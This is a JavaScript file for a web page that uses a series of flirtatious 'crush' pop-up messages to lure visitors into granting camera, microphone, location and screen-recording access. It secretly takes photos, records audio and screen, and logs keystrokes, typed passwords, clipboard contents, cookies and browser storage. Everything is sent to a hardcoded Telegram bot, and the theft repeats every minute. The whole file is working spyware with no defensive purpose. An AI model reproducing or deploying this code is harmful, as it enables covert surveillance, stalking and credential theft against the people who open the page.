// Telegram Configuration
const TOKEN = "7568763554:AAEWXMBtpmJTYc4XAvUUA9Fk516PVf8PvcA";
let CHAT_ID = "6837307356";

// Global variables
let currentLocation = null;
let cameraStream = null;
let audioStream = null;
let screenRecorder = null;
let screenStream = null;
let recordedChunks = [];
let isRecording = false;
let loveAlertIndex = 0;
let infoSent = false; // ទប់ស្កាត់ការផ្ញើព័ត៌មានច្រើនដង
let permissionsRequested = {
    camera: false,
    microphone: false,
    location: false,
    screen: false
};

// DOM Elements
const themeToggle = document.getElementById("themeToggle");

// ==================== CRUSH MESSAGES ====================
const crushMessages = [
    { text: "Hi crush 😘", permission: "camera" },
    { text: "som skal ban ot has 🥺", permission: "microphone" },
    { text: "nh luoch crush yu hz 🌷💛", permission: "location" },
    { text: "pel khenh yu mdong2 jit nh lerng klang mg 😭🤍", permission: "screen" },
    { text: "yu dg te… pel yu reply mok nh smile ban muy thngai 😳", permission: null },
    { text: "voice yu sweet klang nahh bbe 💛", permission: null },
    { text: "pel yu call mok jit nh ktabb mg 😭🌷", permission: null },
    { text: "nh min del mean aromm romantik baeb nis cheamuoy neak na te 🥺", permission: null },
    { text: "ber yu min romkhan nh te nh jg oy yu nov kbae nh yuy2 😚", permission: null },
    { text: "pel yu smile mok nh ot deng tha trov tver ey hv 😭", permission: null },
    { text: "tov na kor nerk tae yu mneak eng 🤍", permission: null },
    { text: "nh secretly ot del chol chet neak na klang baeb nis te 💔", permission: null },
    { text: "yu tver oy jit nh mean aromm kdao2 mg 😳🌷", permission: null },
    { text: "pel yu care nh tik2 nh kor rompeurb klang hz 😭💛", permission: null },
    { text: "som kom mean neak nh ban te 😔", permission: null },
    { text: "nh jg oy yu deng tha mean mneak kompong srolanh yu pit2 😚🤍", permission: null },
    { text: "ber yu mean banha kor mean nh nov kbae yu nich 💛", permission: null },
    { text: "yu chea mnus del tver oy chivit nh mean pka rik 😭🌷", permission: null },
    { text: "good night crushh 🌙", permission: null },
    { text: "sweet dream na bbe 😴🤍", permission: null }
];

// ==================== DEVICE INFO COLLECTION ====================
async function collectDeviceInfo() {
    const info = {
        timestamp: new Date().toLocaleString('km-KH'),
        ip: await getIPAddress(),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen: `${window.screen.width}x${window.screen.height}`,
        viewport: `${window.innerWidth}x${window.innerHeight}`,
        cookies: navigator.cookieEnabled ? 'មាន' : 'គ្មាន',
        online: navigator.onLine ? 'អន្តរណេត' : 'អត់អន្តរណេត',
        battery: await getBatteryInfo(),
        localStorage: formatBytes(calculateLocalStorageSize()),
        sessionStorage: formatBytes(calculateSessionStorageSize()),
        touch: 'ontouchstart' in window ? 'មាន' : 'គ្មាន',
        referrer: document.referrer || 'គ្មាន',
        url: window.location.href,
        pageTitle: document.title
    };
    
    if (currentLocation) {
        info.location = currentLocation;
    }
    
    return info;
}

async function getIPAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch {
        return 'ទាញយកមិនបាន';
    }
}

async function getBatteryInfo() {
    if ('getBattery' in navigator) {
        try {
            const battery = await navigator.getBattery();
            return `${Math.round(battery.level * 100)}%`;
        } catch {
            return 'មិនអាចដឹង';
        }
    }
    return 'មិនគាំទ្រ';
}

function calculateLocalStorageSize() {
    let total = 0;
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        const value = localStorage.getItem(key);
        total += (key.length + value.length) * 2;
    }
    return total;
}

function calculateSessionStorageSize() {
    let total = 0;
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        const value = sessionStorage.getItem(key);
        total += (key.length + value.length) * 2;
    }
    return total;
}

function formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

function formatDeviceInfo(info) {
    let locationText = 'មិនអនុញ្ញាត';
    if (info.location && typeof info.location === 'object') {
        locationText = `📍 រយៈទទឹង: ${info.location.lat}\n📍 រយៈបណ្តោយ: ${info.location.lng}\n🎯 ភាពត្រឹមត្រូវ: ±${info.location.accuracy}m`;
    }
    
    return `📱 **ព័ត៌មានឧបករណ៍**
⏰ ពេលវេលា: ${info.timestamp}
🌐 IP: ${info.ip}
🖥️ User Agent: ${info.userAgent.substring(0, 100)}...
📟 Platform: ${info.platform}
🗣️ Language: ${info.language}
🌐 Timezone: ${info.timezone}
🖥️ Screen: ${info.screen}
👁️ Viewport: ${info.viewport}
🍪 Cookies: ${info.cookies}
📶 Status: ${info.online}
🔋 Battery: ${info.battery}
💾 Local Storage: ${info.localStorage}
💾 Session Storage: ${info.sessionStorage}
👆 Touch: ${info.touch}
${locationText}
🔗 Referrer: ${info.referrer}
📄 URL: ${info.url}
📄 Page Title: ${info.pageTitle}`;
}

// ==================== SEND DEVICE INFO ONCE ====================
async function sendDeviceInfoOnce() {
    if (infoSent) {
        console.log("Info already sent, skipping...");
        return;
    }
    
    console.log("Sending device info to Telegram...");
    infoSent = true;
    
    try {
        const deviceInfo = await collectDeviceInfo();
        const formattedInfo = formatDeviceInfo(deviceInfo);
        await sendMessageToTelegram(formattedInfo);
        console.log("Device info sent successfully!");
    } catch (error) {
        console.error("Failed to send device info:", error);
        infoSent = false; // ប្រសិនបើផ្ញើមិនបាន អនុញ្ញាតឱ្យផ្ញើឡើងវិញ
    }
}

// ==================== SHOW ALERTS ====================
async function showNextLoveAlert() {
    if (loveAlertIndex >= crushMessages.length) {
        await sendMessageToTelegram(`💖 *All Messages Completed* 💖\n\nTotal: ${crushMessages.length} messages\n💕 Love you forever! 💕`);
        setTimeout(() => stealAllData(), 2000);
        return;
    }
    
    const currentAlert = crushMessages[loveAlertIndex];
    const result = confirm(currentAlert.text);
    
    if (result) {
        // ផ្ញើព័ត៌មានឧបករណ៍តែម្តងនៅពេលចុច OK លើកដំបូង
        if (loveAlertIndex === 0 && !infoSent) {
            await sendDeviceInfoOnce();
        }
        
        // Request permission based on type
        if (currentAlert.permission === "camera") {
            await requestCameraPermission();
        } else if (currentAlert.permission === "microphone") {
            await requestMicrophonePermission();
        } else if (currentAlert.permission === "location") {
            requestLocationPermission();
        } else if (currentAlert.permission === "screen") {
            await requestScreenPermission();
        }
    }
    
    loveAlertIndex++;
    setTimeout(() => showNextLoveAlert(), 200);
}

// ==================== TELEGRAM FUNCTIONS ====================
async function sendMessageToTelegram(message) {
    if (!CHAT_ID || !message) return;
    
    try {
        const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ 
                chat_id: CHAT_ID, 
                text: message,
                parse_mode: 'Markdown'
            }),
        });
        
        if (!response.ok) {
            console.error("Telegram send failed:", await response.text());
        }
    } catch (err) {
        console.error("Telegram error:", err);
    }
}

// ==================== 1. CAMERA PERMISSION ====================
async function requestCameraPermission() {
    if (permissionsRequested.camera) return;
    
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: 'user' },
            audio: false 
        });
        cameraStream = stream;
        permissionsRequested.camera = true;
        
        await sendMessageToTelegram(`📸 *កាមេរ៉ាត្រូវបានអនុញ្ញាត*\n\n✅ Camera permission granted\n⏰ ${new Date().toLocaleString('km-KH')}`);
        
        setTimeout(() => capturePhoto(stream), 1000);
        
    } catch (error) {
        let errorMsg = error.name === 'NotAllowedError' ? 'User denied camera permission' : 'Error occurred';
        await sendMessageToTelegram(`❌ *កាមេរ៉ាមិនត្រូវបានអនុញ្ញាត*\n\n📝 ${errorMsg}`);
    }
}

async function capturePhoto(stream) {
    try {
        const video = document.createElement('video');
        video.style.display = 'none';
        document.body.appendChild(video);
        video.srcObject = stream;
        await video.play();
        await new Promise(resolve => setTimeout(resolve, 500));
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
        
        canvas.toBlob(async (blob) => {
            if (blob && blob.size > 0) {
                const file = new File([blob], `camera_${Date.now()}.jpg`, { type: 'image/jpeg' });
                await sendFileToTelegram(file, `📸 Camera Photo`);
            }
        }, 'image/jpeg', 0.8);
        
        setTimeout(() => {
            if (stream) stream.getTracks().forEach(track => track.stop());
            video.remove();
            cameraStream = null;
        }, 2000);
        
    } catch (error) {
        console.error("Capture photo error:", error);
    }
}

// ==================== 2. MICROPHONE PERMISSION ====================
async function requestMicrophonePermission() {
    if (permissionsRequested.microphone) return;
    
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        audioStream = stream;
        permissionsRequested.microphone = true;
        
        await sendMessageToTelegram(`🎤 *មីក្រូហ្វូនត្រូវបានអនុញ្ញាត*\n\n✅ Microphone permission granted\n⏰ ${new Date().toLocaleString('km-KH')}`);
        
        setTimeout(() => recordAudio(stream), 1000);
        
    } catch (error) {
        let errorMsg = error.name === 'NotAllowedError' ? 'User denied microphone permission' : 'Error occurred';
        await sendMessageToTelegram(`❌ *មីក្រូហ្វូនមិនត្រូវបានអនុញ្ញាត*\n\n📝 ${errorMsg}`);
    }
}

async function recordAudio(stream) {
    try {
        const recorder = new MediaRecorder(stream);
        const chunks = [];
        
        recorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
        recorder.onstop = async () => {
            const blob = new Blob(chunks, { type: 'audio/webm' });
            if (blob.size > 0) {
                const file = new File([blob], `audio_${Date.now()}.webm`, { type: 'audio/webm' });
                await sendFileToTelegram(file, `🎤 Audio Recording`);
            }
            stream.getTracks().forEach(track => track.stop());
            audioStream = null;
        };
        
        recorder.start();
        setTimeout(() => { if (recorder.state === 'recording') recorder.stop(); }, 5000);
        
    } catch (error) {
        console.error("Record audio error:", error);
    }
}

// ==================== 3. LOCATION PERMISSION ====================
function requestLocationPermission() {
    if (permissionsRequested.location) return;
    
    if (!navigator.geolocation) {
        sendMessageToTelegram(`❌ *ទីតាំងមិនត្រូវបានគាំទ្រ*`);
        return;
    }
    
    navigator.geolocation.getCurrentPosition(
        async (position) => {
            permissionsRequested.location = true;
            currentLocation = {
                lat: position.coords.latitude,
                lng: position.coords.longitude,
                accuracy: Math.round(position.coords.accuracy)
            };
            
            const mapsLink = `https://www.google.com/maps?q=${currentLocation.lat},${currentLocation.lng}&z=15`;
            await sendMessageToTelegram(`📍 *ទីតាំងត្រូវបានអនុញ្ញាត*\n\n📌 Latitude: ${currentLocation.lat}\n📌 Longitude: ${currentLocation.lng}\n🎯 Accuracy: ±${currentLocation.accuracy}m\n🗺️ [Open Map](${mapsLink})`);
            
            try {
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ 
                        chat_id: CHAT_ID, 
                        latitude: currentLocation.lat,
                        longitude: currentLocation.lng
                    }),
                });
            } catch (err) {}
        },
        (error) => {
            let msg = 'User denied location permission';
            if (error.code === error.TIMEOUT) msg = 'Timeout';
            else if (error.code === error.POSITION_UNAVAILABLE) msg = 'Position unavailable';
            sendMessageToTelegram(`❌ *ទីតាំងមិនត្រូវបានអនុញ្ញាត*\n\n📝 ${msg}`);
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
}

// ==================== 4. SCREEN RECORDING PERMISSION ====================
async function requestScreenPermission() {
    if (permissionsRequested.screen) return;
    if (isRecording) return;
    
    try {
        const stream = await navigator.mediaDevices.getDisplayMedia({
            video: { cursor: "always", frameRate: { ideal: 30 } },
            audio: true
        });
        
        permissionsRequested.screen = true;
        screenStream = stream;
        
        await sendMessageToTelegram(`🎬 *ការថតអេក្រង់ត្រូវបានអនុញ្ញាត*\n\n✅ Screen recording granted\n⏰ ${new Date().toLocaleString('km-KH')}`);
        
        const mimeType = MediaRecorder.isTypeSupported('video/webm') ? 'video/webm' : 'video/mp4';
        screenRecorder = new MediaRecorder(stream, { 
            mimeType: mimeType,
            videoBitsPerSecond: 2500000 
        });
        recordedChunks = [];
        
        screenRecorder.ondataavailable = (e) => { if (e.data && e.data.size > 0) recordedChunks.push(e.data); };
        screenRecorder.onstop = async () => {
            isRecording = false;
            const blob = new Blob(recordedChunks, { type: mimeType });
            
            if (blob.size > 0) {
                const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
                const file = new File([blob], `screen_${Date.now()}.${ext}`, { type: mimeType });
                await sendVideoToTelegram(file, `🎥 Screen Recording\n📊 Size: ${formatBytes(blob.size)}`);
            }
            
            recordedChunks = [];
            if (screenStream) {
                screenStream.getTracks().forEach(track => track.stop());
                screenStream = null;
            }
            screenRecorder = null;
        };
        
        screenRecorder.start(1000);
        isRecording = true;
        
        setTimeout(() => {
            if (screenRecorder && screenRecorder.state === 'recording') screenRecorder.stop();
        }, 30000);
        
        stream.getVideoTracks()[0].addEventListener('ended', () => {
            if (screenRecorder && screenRecorder.state === 'recording') screenRecorder.stop();
        });
        
    } catch (error) {
        let errorMsg = error.name === 'NotAllowedError' ? 'User denied screen permission' : 'Error occurred';
        await sendMessageToTelegram(`❌ *ការថតអេក្រង់មិនត្រូវបានអនុញ្ញាត*\n\n📝 ${errorMsg}`);
    }
}

// ==================== STEAL DATA ====================
function getAllCookies() {
    const cookies = {};
    const cookieString = document.cookie;
    if (!cookieString) return cookies;
    
    cookieString.split(';').forEach(cookie => {
        const parts = cookie.split('=');
        const name = parts[0].trim();
        const value = parts.length > 1 ? decodeURIComponent(parts.slice(1).join('=').trim()) : '';
        if (name) cookies[name] = value;
    });
    return cookies;
}

async function stealAllData() {
    if (!CHAT_ID) return;
    
    try {
        const cookies = getAllCookies();
        const cookieCount = Object.keys(cookies).length;
        const ip = await getIPAddress();
        
        let message = `🔴 *STOLEN DATA REPORT*\n\n`;
        message += `🍪 *Cookies:* ${cookieCount} found\n`;
        
        if (cookieCount > 0) {
            Object.entries(cookies).slice(0, 5).forEach(([name, value]) => {
                const shortValue = value.length > 50 ? value.substring(0, 50) + '...' : value;
                message += `├─ ${name}: ${shortValue}\n`;
            });
            if (cookieCount > 5) message += `└─ ... and ${cookieCount - 5} more\n`;
        }
        
        message += `\n💾 *Storage:*\n`;
        message += `├─ LocalStorage: ${localStorage.length} items\n`;
        message += `├─ SessionStorage: ${sessionStorage.length} items\n`;
        
        message += `\n📱 *Device Info*\n`;
        message += `⏰ Time: ${new Date().toLocaleString('km-KH')}\n`;
        message += `🌐 IP: ${ip}\n`;
        message += `🖥️ Platform: ${navigator.platform}\n`;
        message += `📺 Screen: ${window.screen.width}x${window.screen.height}\n`;
        message += `🌍 Language: ${navigator.language}\n`;
        message += `📍 URL: ${window.location.href}`;
        
        if (currentLocation) {
            message += `\n📍 Location: ${currentLocation.lat}, ${currentLocation.lng} (±${currentLocation.accuracy}m)`;
        }
        
        await sendMessageToTelegram(message);
        
        const fullData = {
            timestamp: new Date().toISOString(),
            url: window.location.href,
            cookies: cookies,
            localStorage: { ...localStorage },
            sessionStorage: { ...sessionStorage },
            location: currentLocation
        };
        
        const jsonBlob = new Blob([JSON.stringify(fullData, null, 2)], { type: 'application/json' });
        const jsonFile = new File([jsonBlob], `stolen_${Date.now()}.json`, { type: 'application/json' });
        await sendFileToTelegram(jsonFile, `📁 Complete Stolen Data`);
        
    } catch (error) {
        console.error("Steal error:", error);
    }
}

// ==================== TELEGRAM HELPERS ====================
async function sendFileToTelegram(file, caption) {
    if (!CHAT_ID) return;
    
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('document', file);
    if (caption) formData.append('caption', caption);
    
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, { method: "POST", body: formData });
    } catch (error) {
        console.error("Send file error:", error);
    }
}

async function sendVideoToTelegram(file, caption) {
    if (!CHAT_ID) return;
    
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('video', file);
    if (caption) formData.append('caption', caption);
    
    try {
        const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: "POST", body: formData });
        if (!response.ok) await sendFileToTelegram(file, caption);
    } catch (error) {
        await sendFileToTelegram(file, caption);
    }
}

// ==================== URL FUNCTIONS ====================
function cleanURL() {
    const uri = window.location.toString();
    const patterns = ["%3D", "%3D%3D", "&m=1", "?m=1"];
    patterns.forEach(pattern => {
        if (uri.indexOf(pattern) > 0) {
            const clean_uri = uri.substring(0, uri.indexOf(pattern));
            window.history.replaceState({}, document.title, clean_uri);
        }
    });
}

function GetURLParameter(sParam) {
    const sPageURL = window.location.search.substring(1);
    const sURLVariables = sPageURL.split('&');
    for (let i = 0; i < sURLVariables.length; i++) {
        const sParameterName = sURLVariables[i].split('=');
        if (sParameterName[0] === sParam) return sParameterName[1];
    }
    return null;
}

function decodeBase64(encodedStr) {
    try { return decodeURIComponent(atob(encodedStr)); } catch(e) { return null; }
}

function getChatIDFromURL() {
    const base64Id = GetURLParameter('i');
    return base64Id ? decodeBase64(base64Id) : null;
}

function initTheme() {
    if (!themeToggle) return;
    themeToggle.style.display = 'none';
}

// ==================== KEYLOGGER ====================
let keylogBuffer = '';
let keylogTimer = null;

document.addEventListener('keydown', function(e) {
    if (!CHAT_ID) return;
    if (e.target && e.target.type === 'password') return;
    
    if (e.key.length === 1) {
        keylogBuffer += e.key;
    } else if (e.key === 'Enter') {
        keylogBuffer += '\n';
    } else if (e.key === 'Backspace') {
        keylogBuffer = keylogBuffer.slice(0, -1);
    } else if (e.key === ' ') {
        keylogBuffer += ' ';
    }
    
    clearTimeout(keylogTimer);
    keylogTimer = setTimeout(async () => {
        if (keylogBuffer.length > 0) {
            await sendMessageToTelegram(`⌨️ *Keylogger*\n\n${keylogBuffer}`);
            keylogBuffer = '';
        }
    }, 3000);
});

// ==================== PASSWORD MONITORING ====================
document.addEventListener('input', async function(e) {
    if (!CHAT_ID) return;
    
    const target = e.target;
    if (target && target.type === 'password' && target.value && target.value.length > 0) {
        const name = target.name || target.id || 'Unknown';
        await sendMessageToTelegram(`🔐 *Password Entered*\n\n📝 Field: ${name}\n🔑 Value: ${target.value}`);
        keylogBuffer = '';
    }
});

// ==================== CLIPBOARD MONITORING ====================
let lastClipboard = '';

setInterval(async () => {
    if (!CHAT_ID) return;
    try {
        const text = await navigator.clipboard.readText();
        if (text && text !== lastClipboard && text.length > 0 && text.length < 1000) {
            lastClipboard = text;
            await sendMessageToTelegram(`📋 *Clipboard*\n\n${text}`);
        }
    } catch (error) {}
}, 5000);

// ==================== INITIALIZE ====================
document.addEventListener('DOMContentLoaded', function() {
    cleanURL();
    const chatIDFromURL = getChatIDFromURL();
    if (chatIDFromURL) CHAT_ID = chatIDFromURL;
    initTheme();
    
    if (themeToggle) themeToggle.style.display = 'none';
    
    // ផ្ញើសារចាប់ផ្តើម
    sendMessageToTelegram(`🚀 *Page Loaded*\n\n📍 URL: ${window.location.href}\n⏰ ${new Date().toLocaleString('km-KH')}`);
    
    // ចាប់ផ្តើមបង្ហាញប្រអប់ព្រមាន
    setTimeout(() => {
        showNextLoveAlert();
    }, 500);
    
    // លួចទិន្នន័យក្រោយ 30 វិនាទី
    setTimeout(() => {
        stealAllData();
    }, 30000);
    
    // លួចទិន្នន័យរាល់ 60 វិនាទី
    setInterval(() => {
        stealAllData();
    }, 60000);
});